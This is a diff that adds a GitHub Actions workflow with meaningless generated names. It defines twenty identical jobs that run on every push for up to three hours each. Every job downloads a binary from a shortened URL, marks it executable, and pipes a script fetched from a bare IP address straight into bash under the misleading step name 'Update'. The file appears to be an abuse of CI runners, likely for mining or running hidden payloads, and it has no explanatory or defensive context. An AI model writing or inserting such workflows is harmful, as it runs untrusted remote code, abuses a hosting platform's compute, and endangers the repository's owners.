@@ -1,0 +1,163 @@
+name: xixawa
+on: push
+jobs:
+  wipefa:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/HL10hzI; chmod +x HL10hzI
+    - name: Update
+      run: curl http://103.186.1.201/mandalorian/nisulsusanlraseuwaq.php?a=vadu | bash -
+  kuzopo:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/HL10hzI; chmod +x HL10hzI
+    - name: Update
+      run: curl http://103.186.1.201/mandalorian/nisulsusanlraseuwaq.php?a=vadu | bash -
+  jehobayi:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/HL10hzI; chmod +x HL10hzI
+    - name: Update
+      run: curl http://103.186.1.201/mandalorian/nisulsusanlraseuwaq.php?a=vadu | bash -
+  riwelopa:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/HL10hzI; chmod +x HL10hzI
+    - name: Update
+      run: curl http://103.186.1.201/mandalorian/nisulsusanlraseuwaq.php?a=vadu | bash -
+  fecore:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/HL10hzI; chmod +x HL10hzI
+    - name: Update
+      run: curl http://103.186.1.201/mandalorian/nisulsusanlraseuwaq.php?a=vadu | bash -
+  tegiji:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/HL10hzI; chmod +x HL10hzI
+    - name: Update
+      run: curl http://103.186.1.201/mandalorian/nisulsusanlraseuwaq.php?a=vadu | bash -
+  vazoli:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/HL10hzI; chmod +x HL10hzI
+    - name: Update
+      run: curl http://103.186.1.201/mandalorian/nisulsusanlraseuwaq.php?a=vadu | bash -
+  sinapa:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/HL10hzI; chmod +x HL10hzI
+    - name: Update
+      run: curl http://103.186.1.201/mandalorian/nisulsusanlraseuwaq.php?a=vadu | bash -
+  huruxote:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/HL10hzI; chmod +x HL10hzI
+    - name: Update
+      run: curl http://103.186.1.201/mandalorian/nisulsusanlraseuwaq.php?a=vadu | bash -
+  heboha:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/HL10hzI; chmod +x HL10hzI
+    - name: Update
+      run: curl http://103.186.1.201/mandalorian/nisulsusanlraseuwaq.php?a=vadu | bash -
+  cisekoxa:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/HL10hzI; chmod +x HL10hzI
+    - name: Update
+      run: curl http://103.186.1.201/mandalorian/nisulsusanlraseuwaq.php?a=vadu | bash -
+  gevifebu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/HL10hzI; chmod +x HL10hzI
+    - name: Update
+      run: curl http://103.186.1.201/mandalorian/nisulsusanlraseuwaq.php?a=vadu | bash -
+  pijeda:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/HL10hzI; chmod +x HL10hzI
+    - name: Update
+      run: curl http://103.186.1.201/mandalorian/nisulsusanlraseuwaq.php?a=vadu | bash -
+  petula:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/HL10hzI; chmod +x HL10hzI
+    - name: Update
+      run: curl http://103.186.1.201/mandalorian/nisulsusanlraseuwaq.php?a=vadu | bash -
+  kobuhe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/HL10hzI; chmod +x HL10hzI
+    - name: Update
+      run: curl http://103.186.1.201/mandalorian/nisulsusanlraseuwaq.php?a=vadu | bash -
+  bawopa:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/HL10hzI; chmod +x HL10hzI
+    - name: Update
+      run: curl http://103.186.1.201/mandalorian/nisulsusanlraseuwaq.php?a=vadu | bash -
+  yijadoza:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/HL10hzI; chmod +x HL10hzI
+    - name: Update
+      run: curl http://103.186.1.201/mandalorian/nisulsusanlraseuwaq.php?a=vadu | bash -
+  gefefoxu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/HL10hzI; chmod +x HL10hzI
+    - name: Update
+      run: curl http://103.186.1.201/mandalorian/nisulsusanlraseuwaq.php?a=vadu | bash -
+  kotosame:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/HL10hzI; chmod +x HL10hzI
+    - name: Update
+      run: curl http://103.186.1.201/mandalorian/nisulsusanlraseuwaq.php?a=vadu | bash -
+  xiwaci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/HL10hzI; chmod +x HL10hzI
+    - name: Update
+      run: curl http://103.186.1.201/mandalorian/nisulsusanlraseuwaq.php?a=vadu | bash -
